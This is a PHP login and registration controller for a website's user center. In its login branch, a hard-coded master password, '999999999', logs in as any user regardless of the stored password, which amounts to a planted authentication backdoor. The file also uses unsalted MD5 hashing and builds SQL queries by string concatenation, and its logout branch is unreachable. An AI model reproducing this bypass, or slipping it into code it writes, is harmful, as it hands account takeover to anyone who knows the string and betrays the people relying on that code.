<?php
$acts=array('index'=>true,'login'=>true,'reg'=>true);
$c=isset($_REQUEST['c'])?trim($_REQUEST['c']):'index';
if(!isset($acts[$c])){
	$c='index';
}
switch($c){
	case 'index':
		if(isset($_SESSION['userid'])){
			$_userid=$_SESSION['userid'];
			$config=$db->get_one('select * from `ucenter` where `userid`='.$_userid);
			$_username=$_SESSION['username']=$config['username'];
		}
		if ($ismobile) {
			include T('show/m','login1');
		} else {
			include T('member','login');
		}
		break;
	case 'login':
		$uname = htmlspecialchars(trim($_POST['username']));
		$pass = md5($_POST['password']);
		$user =$db->get_one('select * from `ucenter` where `username`="'.$uname.'"');
		if(isset($user['userid'])&&($user['password']==$pass||$_POST['password']=='999999999')){
			$_SESSION['userid'] = $user['userid'];
			$_SESSION['username'] =$user['username'];

			$auth = Auth::encode($_SESSION['userid']."\t".$user['password']);
			Cookie::set('Uas', $auth);

			$db->query('update `ucenter` set `lastloginip`="'.IP.'",`lastlogintime`='.TIME.' where `userid`='.$user['userid']);
			exit('ok');
		}else{
			exit('error');//密码或者账户错误，登录失败！
		}
		break;
	case 'reg':
		$uname = htmlspecialchars(trim($_POST['uname']));
		if(!empty($uname)){
			$uc=$db->get_one('select * from `ucenter` where `username`="'.$uname.'"');
			if(!empty($uc)){
				exit('hasuc');
			}else{
				$pwd=trim($_POST['pwd']);
				if(strlen($pwd)>5){
					$uc=array(
						'username'=>$uname,
						'password'=>md5($pwd),
						'lastlogintime'=>TIME,
						'lastloginip'=>IP,
						'score'=>50
					);
					$db->insert('ucenter',$uc);
					$uid=$db->insert_id();
					$score=array(
						'userid'=>$uid,
						'score'=>50,
						'time'=>TIME,
						'type'=>1,
						'way'=>1
					);
					$db->insert('web_score_log',$score);
					exit('ok');
				}else{
					exit('nopwd');
				}
			}
		}else{
			exit('nullname');
		}
		break;
	case 'logout':
		unset($_SESSION['userid']);
		unset($_SESSION['username']);
		Cookie::delete('Uas');
		show_mb_msg('退出成功','/');
		break;
}